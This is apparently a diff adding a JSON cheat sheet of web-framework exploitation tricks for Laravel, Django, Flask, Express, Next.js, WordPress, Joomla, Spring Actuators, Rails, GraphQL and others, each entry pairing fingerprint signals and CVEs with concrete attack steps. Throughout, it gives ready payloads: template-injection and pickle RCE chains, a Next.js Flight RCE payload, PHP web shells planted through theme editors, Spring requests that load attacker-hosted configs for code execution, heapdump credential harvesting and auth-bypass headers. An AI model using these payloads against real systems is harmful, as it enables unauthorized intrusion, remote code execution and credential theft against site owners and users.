@@ -1,0 +1,338 @@
+{
+  "_comment": "Framework-specific exploitation tricks (signals to fingerprint, known vulns/CVEs, and concrete attack tricks). Synthesized from general security knowledge.",
+  "frameworks": [
+    {
+      "framework": "Laravel",
+      "signals": [
+        "XSRF-TOKEN + laravel_session cookies",
+        "_ignition/health-check endpoint (Ignition debug tool)",
+        "_debugbar / telescope / horizon endpoints + Blade error pages"
+      ],
+      "vulns": [
+        "APP_KEY leak → AES-256-CBC/GCM cookie forgery → PHP deserialization RCE (CVE-2018-15133; Invoice Ninja CVE-2024-55555, Snipe-IT CVE-2024-48987, Crater CVE-2024-55556)",
+        "HTTP argv/env override → auth bypass (CVE-2024-52301)",
+        "Wildcard file validation bypass on files.* (CVE-2025-27515)",
+        "Debug-mode Whoops reflected XSS (CVE-2024-13918/13919)",
+        "Unsafe SQL functions (DB::raw / orderByRaw style concat)"
+      ],
+      "tricks": [
+        "Offline APP_KEY brute-force of leaked XSRF-TOKEN/laravel_session ciphertexts (Synacktiv: ~3.99% crack rate, top-10 default keys in commercial templates)",
+        "phpggc Laravel/RCE13|RCE9|RCE15 + laravel_crypto_killer.py encrypt → deliver to any decrypt() sink (route/cookie/session)",
+        "?--env=preprod / ?--env=local query override when register_argc_argv=On",
+        "Multipart field files[0][__asterisk__payload]=@shell.php to skip validator but still write UploadedFile",
+        "LFI/debug page → /../.env to recover APP_KEY and DB creds"
+      ]
+    },
+    {
+      "framework": "Django",
+      "signals": [
+        "sessionid + csrftoken cookies",
+        "/admin/ login + /static/admin/css/base.css hashes",
+        "debug stack traces / X-Frame-Options error pages for version fingerprinting"
+      ],
+      "vulns": [
+        "Cache pickle deserialization → RCE (FileBasedCache / Redis / DB backends; HackerOne #1415436)",
+        "Host header / password-reset poisoning via request.META['HTTP_HOST'] bypassing ALLOWED_HOSTS",
+        "SSTI in Django Template Language (DTL is Turing-complete)",
+        "PickleSerializer + signed_cookies session backend → SECRET_KEY leak = RCE",
+        "SQLi in QuerySet values/alias/JSONField key names (CVE-2024-42005, CVE-2025-57833); log injection (CVE-2025-48432)"
+      ],
+      "tricks": [
+        "{{7*7}} → 49 SSTI probe; {{''.__class__.mro()[1].__subclasses__()}} walk to subprocess.Popen",
+        "{{ users.values }} QuerySet dump bypasses __str__ filtering even when RCE is blocked",
+        "badsecrets against sessionid to test known/weak SECRET_KEY",
+        "Drop malicious pickle at /var/tmp/django_cache/<key> (os.system __reduce__)",
+        "signing.dumps(RCE(), key=SECRET_KEY, serializer=PickleSerializer) → sessionid=RCE cookie"
+      ]
+    },
+    {
+      "framework": "Flask",
+      "signals": [
+        "session cookie (URL-safe base64, signed not encrypted)",
+        "Werkzeug server headers / debugger PIN page",
+        "Jinja2 template error pages"
+      ],
+      "vulns": [
+        "SSTI via Jinja2 when user input reaches render_template_string/format",
+        "Session cookie forgery → privilege escalation when secret key is leaked/weak",
+        "Unsafe proxy URL concatenation → SSRF via '@' host confusion in request path"
+      ],
+      "tricks": [
+        "flask-unsign --decode / --wordlist rockyou --unsign / --sign {'logged_in':True}",
+        "GET @/ or @attacker.example request-target to reach Flask routes and poison concatenated URLs",
+        "ripsession to automate cookie forgery across a wordlist",
+        "sqlmap --eval to sign SQLi payloads with a known Flask secret"
+      ]
+    },
+    {
+      "framework": "Node.js / Express",
+      "signals": [
+        "X-Powered-By: Express",
+        "connect.sid, s:<sig> and j:<json> cookies",
+        "_method=PUT/DELETE hidden fields + body-parser error pages"
+      ],
+      "vulns": [
+        "qs / extended urlencoded parser → prototype pollution, mass assignment, NoSQLi via nested keys",
+        "trust proxy misconfig → X-Forwarded-* header spoofing (host/proto/ip)",
+        "Session fixation (no req.session.regenerate() after login)",
+        "Method-override smuggling of PUT/PATCH/DELETE through POST-only edges",
+        "Signed-cookie secret brute-force / rotation-key weakness"
+      ],
+      "tricks": [
+        "?user[role]=admin&filters[name][$ne]=x (qs nesting, __proto__/constructor[prototype] payloads)",
+        "X-Forwarded-Host/Proto/For spoofing for reset-poisoning, IP allowlist and rate-limit bypass",
+        "X-HTTP-Method-Override: DELETE or POST /x?_method=PUT to reach hidden routes/CSRF",
+        "cookie-monster -c <cookie> -w wordlist to brute cookie secrets then re-sign"
+      ]
+    },
+    {
+      "framework": "Next.js",
+      "signals": [
+        "/_next/static/<buildId>/ assets and buildId in HTML",
+        "Next-Action header on POST / (Server Actions)",
+        "text/x-component Flight responses + x-nextjs-prerender"
+      ],
+      "vulns": [
+        "Middleware auth bypass via x-middleware-subrequest header (CVE-2025-29927)",
+        "RSC Flight deserialization → prototype pollution → RCE (CVE-2025-55182 / React2Shell, react-server-dom-webpack 19.0.0–19.2.0)",
+        "RSC cache poisoning / content-type confusion → stored XSS (CVE-2025-49005, Re:CACHE)",
+        "RSC DoS + Server Function source disclosure (CVE-2025-55183/55184/67779)",
+        "Client-side path traversal (CSPT) and dangerouslySetInnerHTML XSS"
+      ],
+      "tricks": [
+        "x-middleware-subrequest: middleware:middleware:... to flip 307→200 on protected routes",
+        "Flight payload {\"then\":\"$1:__proto__:then\", _formData.get:\"$1:constructor:constructor\", _prefix: require('child_process').exec(...)}",
+        "react2shell-scanner --safe-check (500 + E{\"digest\"} = vulnerable oracle)",
+        "Hash↔function mapping: regex createServerReference(...) in chunks + source maps, swap Next-Action values",
+        "Accept/Rsc: 1 header to force RSC payload; _buildManifest.js for route enumeration"
+      ]
+    },
+    {
+      "framework": "Vue.js",
+      "signals": [
+        "v-html directive / Vue runtime in JS bundles",
+        "__VUE__ global + Vue devtools",
+        "vue-template-compiler / SSR builds"
+      ],
+      "vulns": [
+        "v-html raw HTML XSS (img onerror)",
+        "v-bind:href/src javascript: URL injection",
+        "SSR untrusted template → RCE (vue-template-compiler CVEs)",
+        "Prototype pollution in plugins (vue-i18n deep-merge GHSA-p2ph-7g93-hw3m)",
+        "Open redirect via unchecked route query next param"
+      ],
+      "tricks": [
+        "<img src=x onerror=alert(1)> through v-html",
+        "javascript:alert(1) via v-bind:href user input",
+        "createSSRApp({ template: userProvidedHtml }) = server-side code exec",
+        "JSON.parse('{\"__proto__\":{\"polluted\":true}}') into deepmerge helper",
+        "window.location.assign(this.$route.query.next) open redirect"
+      ]
+    },
+    {
+      "framework": "Angular",
+      "signals": [
+        "_ngcontent-* attributes on DOM",
+        "[id].main.js compiled bundles + //# sourceMappingURL",
+        "ng-version / angular.json sourceMap config"
+      ],
+      "vulns": [
+        "bypassSecurityTrustHtml/Url/Style misuse → sanitizer bypass XSS",
+        "Runtime template injection {{constructor.constructor('alert(1)')()}}",
+        "DOM XSS via ElementRef.nativeElement, Renderer2.setAttribute/setProperty, jQuery html()",
+        "Open redirect via window.location / document.location sinks"
+      ],
+      "tricks": [
+        "bypassSecurityTrustHtml('<svg onclick=alert(1)>') — script tags inert via innerHTML but on* attributes fire",
+        "{{constructor.constructor('alert(1)')()}} when attacker input is compiled as template (not plain interpolation)",
+        "renderer2.setAttribute(el,'onerror','alert(1)') on <img>",
+        "document.write/createElement + appendChild script sinks",
+        "Source-map disclosure for source reconstruction when sourceMap enabled"
+      ]
+    },
+    {
+      "framework": "WordPress",
+      "signals": [
+        "wp-content/wp-includes paths, meta generator tag",
+        "/wp-json/wp/v2/users + xmlrpc.php",
+        "/wp-login.php, /wp-admin/admin-ajax.php, license.txt/readme.html version"
+      ],
+      "vulns": [
+        "Unauth plugin/theme SQLi/LFI/file-deletion via wp_ajax_nopriv_ handlers (WP Job Portal, Depicter, Kubio, Litho)",
+        "Trusted-header REST impersonation → admin creation (WooCommerce Payments ≤5.6.1, X-Wcpay-Platform-Checkout-User: 1)",
+        "Nonce-as-authorization misuse → arbitrary plugin install/activate RCE (FunnelKit, Motors)",
+        "XML-RPC credential brute-force + pingback SSRF/DDoS + 2FA bypass",
+        "Pre-auth login XSS → DOM clobbering → RCE chain (XSS2Shell, core <7.0.3); MU-plugin stealth persistence"
+      ],
+      "tricks": [
+        "?author=1 user-ID enumeration + wp-json/wp/v2/users dump",
+        "system.multicall for multi-cred brute-force; wp.uploadFile for RCE once creds obtained",
+        "X-Wcpay-Platform-Checkout-User: 1 on POST /wp-json/wp/v2/users with roles:[administrator]",
+        "admin-ajax.php action=<nopriv> fontfamily=../../../wp-config.php (arbitrary delete/LFI/SQLi)",
+        "Theme Editor → edit 404.php with system($_GET['cmd']) → curl /wp-content/themes/<theme>/404.php?cmd=id"
+      ]
+    },
+    {
+      "framework": "Joomla",
+      "signals": [
+        "<meta name=generator content=Joomla>",
+        "/administrator/manifests/files/joomla.xml + /language/en-GB/en-GB.xml version files",
+        "README.txt + robots.txt markers"
+      ],
+      "vulns": [
+        "Unauth API info disclosure (CVE-2023-23752, Joomla 4.0.0–4.2.7)",
+        "Admin template-edit → PHP injection → RCE",
+        "XSS → RCE / privilege-escalation chains (JoomSploit)"
+      ],
+      "tricks": [
+        "/api/v1/users?public=true and /api/index.php/v1/config/application?public=true (CVE-2023-23752)",
+        "Templates → Customise → error.php → system($_GET['cmd']) → /templates/protostar/error.php?cmd=id",
+        "droopescan scan joomla --url <target>",
+        "joomla-brute.py default creds (admin:admin)"
+      ]
+    },
+    {
+      "framework": "Spring Actuators",
+      "signals": [
+        "/actuator/* base path (Spring Boot 2.x) or root /health,/env (1.x)",
+        "/health, /info, /env, /beans, /mappings, /heapdump, /loggers",
+        "Spring Boot version banners / error pages"
+      ],
+      "vulns": [
+        "Exposed actuator endpoints → sensitive data + env/config disclosure",
+        "/jolokia reloadByURL → logback XXE/RCE via external XML config",
+        "/env property modification → XStream deserialization RCE (Eureka serviceURL) + H2 RCE chain",
+        "/heapdump JVM snapshot secrets (DB creds, tokens, Basic-Auth)",
+        "/loggers level escalation to capture auth credentials"
+      ],
+      "tricks": [
+        "wget /actuator/heapdump && strings | grep 'Authorization: Basic' then base64 -d; JDumpSpider/VisualVM OQL for DataSourceProperties",
+        "POST /env eureka.client.serviceUrl.defaultZone=http://attacker/xstream",
+        "/jolokia/exec/.../reloadByURL/http:!/!/attacker/logback.xml",
+        "POST /actuator/loggers/org.springframework.security {configuredLevel:TRACE} then harvest /actuator/logfile",
+        "GET ;@evil.com/url matrix-parameter pathname confusion → SSRF"
+      ]
+    },
+    {
+      "framework": "JSP",
+      "signals": [
+        "*.jsp / *.do extensions",
+        "JSESSIONID cookie + Tomcat error pages",
+        "JSTL/EL ${} expression usage"
+      ],
+      "vulns": [
+        "getContextPath() link manipulation → XSS via protocol-relative URL injection",
+        "EL / JSTL expression injection in templates",
+        "Related: Struts2 OGNL / Spring EL RCE families"
+      ],
+      "tricks": [
+        "/&sol;attacker.example/xss.js&num;/..;/..;/contextPathExample/test.jsp → //attacker.example/xss.js script src XSS",
+        "Prepend request.getContextPath() into src/href/action attributes without HTML-attribute encoding",
+        "URL-encode then HTML-attribute-encode dynamic values; fixed trusted base to avoid request-controlled origin"
+      ]
+    },
+    {
+      "framework": "Python",
+      "signals": [
+        "eval()/exec()/pickle.loads sinks",
+        "SSTI in Jinja2/DTL render paths",
+        "pickle/yaml deserialization endpoints"
+      ],
+      "vulns": [
+        "eval/exec expression injection",
+        "pickle deserialization → __reduce__ RCE",
+        "Python sandbox escapes (load_name/load_const OOB, js2py CVE-2024-28397)",
+        "ReportLab/xhtml2pdf triple-bracket [[[...]]] rl_safe_eval RCE (CVE-2023-33733)",
+        "Class pollution (Python's prototype pollution)"
+      ],
+      "tricks": [
+        "\"+str(True)+\" probe to confirm expression evaluation vs reflection",
+        "pickle class RCE: __reduce__ → os.system",
+        "[[[ expression ]]] injection into PDF generation flows (xhtml2pdf)",
+        "Subclass-walk object graph for sandbox escape gadgets"
+      ]
+    },
+    {
+      "framework": "Go (net/http)",
+      "signals": [
+        "Go net/http default server headers/behaviour",
+        "html/template vs text/template rendering",
+        ".go route handlers / ServeMux patterns"
+      ],
+      "vulns": [
+        "ServeMux CONNECT method skips path canonicalization → path traversal/authz bypass",
+        "text/template (not html/template) SSTI/XSS",
+        "SSRF via proxied request targets",
+        "Race-condition / TOCTOU logic bugs"
+      ],
+      "tricks": [
+        "curl --path-as-is -X CONNECT http://target/../flag to bypass cleanPath redirect on ordinary methods",
+        "Compare CONNECT vs GET/POST response to detect auth-boundary traversal",
+        "Inject {{.}} / template actions into text/template sinks"
+      ]
+    },
+    {
+      "framework": "Ruby / Rails",
+      "signals": [
+        "_session_id cookie (signed+encrypted, secret_key_base derived)",
+        "Rack/Sinatra/Rails stack traces + Rack headers",
+        "config/master.key, credentials.yml.enc, Gemfile.lock"
+      ],
+      "vulns": [
+        "Arbitrary file upload to config/initializers/ → boot-time RCE (CVE-2024-46986 Camaleon)",
+        "Active Storage image transformation command injection (CVE-2025-24293, mini_magick)",
+        "Rack::Static LFI / path traversal (CVE-2025-27610)",
+        "ReDoS family: Rack Content-Type (CVE-2024-25126), REXML (CVE-2024-49761), CGI cookie (CVE-2025-27219/27220)",
+        "Nested mass assignment via permit! on sub-object; secret_key_base → cookie/signed_id forgery; log injection → RCE via load + Pathname.cleanpath"
+      ],
+      "tricks": [
+        "Upload .rb into config/initializers/ or eager-load paths to get boot-time code exec",
+        "Forged cookie: ActiveSupport::MessageEncryptor aes-256-gcm + KeyGenerator(secret_key_base) decrypt→modify role→re-sign",
+        "Forge signed_id/sgid (find_signed!, GlobalID::Locator.locate_signed) for IDOR→authz bypass",
+        "CVE-2025-24293: image_tag blob.variant(params[:t]=>params[:v]) fuzz transform names to reach MiniMagick exec",
+        "Log poison: %0A][0]=1;system(\"id\")#://../../../../logs/error.log then load cleanpath-resolved log"
+      ]
+    },
+    {
+      "framework": "Perl",
+      "signals": [
+        ".pl/.pm endpoints + mod_perl handler registration in httpd.conf",
+        "CGI.pm / backticks / qx// usage",
+        "Dell/EMC-like appliance Perl modules"
+      ],
+      "vulns": [
+        "Command injection via backticks/qx//, one-arg system STRING, two-arg open 'cmd |'",
+        "Pre-auth RCE via raw $r->uri() concatenated into shell command (Dell UnityVSA CVE-2025-36604)",
+        "IPC::Open3 single-string shell handling + explicit /bin/sh -c sinks"
+      ],
+      "tricks": [
+        "GET /ui/health;id with separators ; && | $() %0A; end-string payloads like ;id#",
+        "Unauthenticated login-redirect branch (type=='login') to reach getCASURL backtick sink",
+        "Grep for qx//, open\\s*\\(|, system\\(\" and trace sink→$r entry for pre-auth reachability",
+        "Patch-diff modules for inconsistent quoting between branches"
+      ]
+    },
+    {
+      "framework": "GraphQL",
+      "signals": [
+        "/graphql, /graphiql, /graphql/console, /api/graphql paths",
+        "query{__typename} → {\"data\":{\"__typename\":\"Query\"}}",
+        "Introspection __schema responses; engine fingerprints (graphw00f)"
+      ],
+      "vulns": [
+        "Introspection schema disclosure + broken object-level authorization (BOLA) via query variables",
+        "DoS via alias/directive/field duplication, array batching, @defer/@stream amplification",
+        "CSRF via form-urlencoded/GET + cross-site WebSocket hijacking",
+        "Multipart Upload scalar abuse (CSRF, variable reuse, orphan file parts)",
+        "Engine CVEs: async-graphql directive overload (CVE-2024-47614), graphql-java ENF depth bypass (CVE-2024-40094), WPGraphQL SSRF→RCE (CVE-2023-23684), Apollo Gateway planner DoS (CVE-2025-32031)"
+      ],
+      "tricks": [
+        "Alias-based brute-force / rate-limit bypass: isValidDiscount1..N in one request; batching 1000s of credential pairs",
+        "Bypass introspection filters with newline after __schema, or switch GET/form-urlencoded/WebSocket",
+        "APQ is not a safelist: send unknown sha256Hash → on PersistedQueryNotFound resend with full query string",
+        "updateProfile(username:INJECT) chained/unauthorized mutations; forged schema via error-based clairvoyance/InQL bruteforcer",
+        "@include(if:true) x N and recursive fragments ...A/...B to exhaust planner/parser"
+      ]
+    }
+  ]
+}
